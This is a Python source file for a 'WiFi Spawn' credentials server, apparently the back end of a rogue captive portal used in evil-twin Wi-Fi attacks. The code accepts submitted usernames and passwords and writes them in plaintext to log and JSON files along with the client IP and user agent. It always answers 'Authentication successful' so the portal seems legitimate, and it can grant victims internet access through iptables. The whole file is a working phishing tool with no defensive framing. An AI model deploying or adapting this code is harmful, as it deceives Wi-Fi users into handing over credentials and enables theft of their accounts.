#!/usr/bin/env python3

"""
WiFi Spawn Credentials Server
Handles credential submissions from the captive portal
"""

import json
import logging
import socket
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import threading
import time
import os

# Configuration
HOST = '192.168.4.1'
PORT = 8080
CREDS_FILE = '/tmp/wifispawn/logs/credentials.log'
LOG_FILE = '/tmp/wifispawn/logs/server.log'
AUTHENTICATED_IPS_FILE = '/tmp/wifispawn/logs/authenticated_ips.log'

# Internet sharing configuration
PROVIDE_INTERNET = os.getenv('PROVIDE_INTERNET', 'false').lower() == 'true'
REQUIRE_AUTH_FOR_INTERNET = os.getenv('REQUIRE_AUTH_FOR_INTERNET', 'true').lower() == 'true'

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def authenticate_ip(ip_address):
    """Mark an IP as authenticated for internet access"""
    if PROVIDE_INTERNET and REQUIRE_AUTH_FOR_INTERNET:
        try:
            # Add IP to authenticated list
            with open(AUTHENTICATED_IPS_FILE, 'a') as f:
                f.write(f"{ip_address}\n")
            
            # Add iptables rule to allow internet access for this IP
            # Remove captive portal redirection for this specific IP
            subprocess.run([
                'iptables', '-t', 'nat', '-I', 'PREROUTING', '1',
                '-s', ip_address, '-j', 'ACCEPT'
            ], check=True, capture_output=True)
            
            logger.info(f"IP {ip_address} authenticated for internet access")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to authenticate IP {ip_address}: {e}")
            return False
        except Exception as e:
            logger.error(f"Error authenticating IP {ip_address}: {e}")
            return False
    
    return False

def is_ip_authenticated(ip_address):
    """Check if an IP is already authenticated"""
    try:
        if os.path.exists(AUTHENTICATED_IPS_FILE):
            with open(AUTHENTICATED_IPS_FILE, 'r') as f:
                authenticated_ips = f.read().splitlines()
                return ip_address in authenticated_ips
    except Exception as e:
        logger.error(f"Error checking IP authentication: {e}")
    
    return False

class CredentialsHandler(BaseHTTPRequestHandler):
    """HTTP request handler for credentials submission"""
    
    def log_message(self, format, *args):
        """Override default logging to use our logger"""
        logger.info(f"{self.address_string()} - {format % args}")
    
    def do_GET(self):
        """Handle GET requests"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        response = """
        <html>
        <head><title>WiFi Portal</title></head>
        <body>
        <h2>WiFi Credentials Server</h2>
        <p>Server is running. Submit credentials via POST to /submit</p>
        </body>
        </html>
        """
        self.wfile.write(response.encode())
    
    def do_POST(self):
        """Handle POST requests (credential submissions)"""
        try:
            # Parse the request
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Get client info
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Parse form data
            parsed_data = parse_qs(post_data)
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]
            
            # Log the credentials
            self.log_credentials(client_ip, username, password, user_agent, timestamp)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Simulate authentication delay
            time.sleep(1)
            
            # Authenticate the user for internet access if enabled
            internet_access_granted = False
            if PROVIDE_INTERNET:
                if not is_ip_authenticated(client_ip):
                    internet_access_granted = authenticate_ip(client_ip)
                else:
                    internet_access_granted = True
                    logger.info(f"IP {client_ip} already authenticated")
            
            # Determine redirect URL based on internet access
            redirect_url = 'http://google.com' if internet_access_granted else 'http://example.com'
            
            # Always return "success" to make it seem legitimate
            response = {
                'success': True,
                'message': 'Authentication successful',
                'internet_access': internet_access_granted,
                'redirect': redirect_url
            }
            
            self.wfile.write(json.dumps(response).encode())
            
            logger.info(f"Credentials captured from {client_ip}: {username} | Internet access: {internet_access_granted}")
            
        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_error(500, 'Internal Server Error')
    
    def do_OPTIONS(self):
        """Handle preflight requests for CORS"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_credentials(self, client_ip, username, password, user_agent, timestamp):
        """Log captured credentials to file"""
        try:
            # Create log entry
            log_entry = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'username': username,
                'password': password,
                'user_agent': user_agent
            }
            
            # Write to credentials file
            with open(CREDS_FILE, 'a') as f:
                f.write(f"{timestamp} | {client_ip} | {username} | {password} | {user_agent}\n")
            
            # Also write JSON format for easier parsing
            json_file = CREDS_FILE.replace('.log', '.json')
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                data = []
            
            data.append(log_entry)
            
            with open(json_file, 'w') as f:
                json.dump(data, f, indent=2)
                
        except Exception as e:
            logger.error(f"Error logging credentials: {e}")

def check_port_available(host, port):
    """Check if port is available"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result != 0

def start_server():
    """Start the credentials server"""
    try:
        # Check if port is available
        if not check_port_available(HOST, PORT):
            logger.error(f"Port {PORT} is already in use")
            return False
        
        # Create and start server
        server = HTTPServer((HOST, PORT), CredentialsHandler)
        
        logger.info(f"Starting credentials server on {HOST}:{PORT}")
        logger.info(f"Credentials will be logged to: {CREDS_FILE}")
        
        # Start server in a thread so it doesn't block
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Shutting down server...")
            server.shutdown()
            server.server_close()
            
        return True
        
    except Exception as e:
        logger.error(f"Error starting server: {e}")
        return False

def main():
    """Main function"""
    print("WiFi Spawn Credentials Server")
    print("=" * 40)
    
    # Create directories if they don't exist
    import os
    os.makedirs('/tmp/wifispawn/logs', exist_ok=True)
    
    # Start the server
    if start_server():
        print("Server started successfully!")
    else:
        print("Failed to start server!")
        exit(1)

if __name__ == "__main__":
    main()